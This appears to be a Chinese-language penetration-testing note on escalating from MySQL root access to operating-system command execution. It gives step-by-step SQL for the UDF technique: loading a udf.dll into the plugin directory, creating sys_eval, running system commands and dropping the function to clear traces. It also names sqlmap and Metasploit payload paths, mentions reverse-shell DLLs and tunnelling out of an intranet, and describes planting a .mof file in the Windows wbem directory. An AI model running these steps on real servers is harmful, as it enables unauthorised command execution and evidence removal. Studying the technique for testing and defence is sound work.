# MySQL 提权

## 一. UDF(user-defined function) 提权

1. 概念定义
    - 用户自定义函数UDF(user-definedfunction)
    - 数据库功能的一种扩展，用来拓展MysQL
    - 由一个或多个Transact-SQL语句组成的子程序，可用于封装代码以便重新使用
2. 工作原理
    - 利用root权限，创建带有调用cmd的西数的udf.dll动态链接库, 最终利用system权限进行提权操作
3. 利用条件
    - 根据MySQL版本确认存放udf.dll路径
    - 根据MySQL版本位数选择相应的udf.dll文件
    - secure_file_priv不为NULL(可以为`""`)
4. 提权流程
    - 确认插件路径(v5.1 前后, 路径不同), 相关命令:
        ```sql
        select @@version;
        show variables like '%plugin%'; # 查看 `plugin_dir`
        ```
    - 使用数据库并创建表
        ```sql
        use mysql;
        create table foo(line blob);
        ```
    - 导入 `udf.dll` 到数据库
        ```sql
        insert into foo values(load_file('/path/to/udf.dll'))
        ```
    - 导入 `udf.dll` 到插件目录
        ```sql
        select * from foo into dumpfile "/path/to/udf/path/udf.dll";
        ```
    - 创建自定义函数
        ```sql
        create function sys_eval returns string soname 'udf.dll';
        ```
    - 执行系统命令
        ```sql
        select sys_eval('whoami');
        ```
    - 清除痕迹
        ```sql
        drop function sys_eval;
        ```

5. 相关利用工具
    - sqlmap
        - payload 路径 /usr/share/sqlmap/data/udf
        - payload解码脚本路径 /usr/share/sqlmap/extra/cloak
    - metasploit
        - payload 路径 /usr/share/metasploit-framework/data/exploits/mysql
    - 也有一些可以实现反弹shell的dll文件, 有人称之为 `反弹端口提权`
6. 数据库出内网
    - 吐司论坛, udf.php
    - navicat, 自带的隧道工具, mysql连接界面, http选项卡, `export Tunnel Script...`

## 二. MOF(Managed Object Format) 提权

1. 概念定义
    - MOF(Managed Object Format), 托管对象格式
2. 思路
    利用 windows 定时以高权限运行 `C:\Windows\System32\wbem\MOF` 目录下 `.mof` 文件的特性, 往这个目录下写文件, 文件就被被自动以高权限执行, 类似 exploit `msf:exploit/windows/smb/ms10_061_spoolss`
3. 提权流程
    - 构造mof文件
        可以参考 `metasploit-framework/lib/msf/core/exploit/wbem_exec.rb`的实现
    - 上传mof文件
        ```sql
        select load_file("/path/to/mof/file") into dumpfile "C:\Windows\System32\wbem\MOF\xxxx.mof"
        ```
    - 利用
    
## Reference

1. [mysql udf提权](https://www.cnblogs.com/02SWD/p/15858250.html)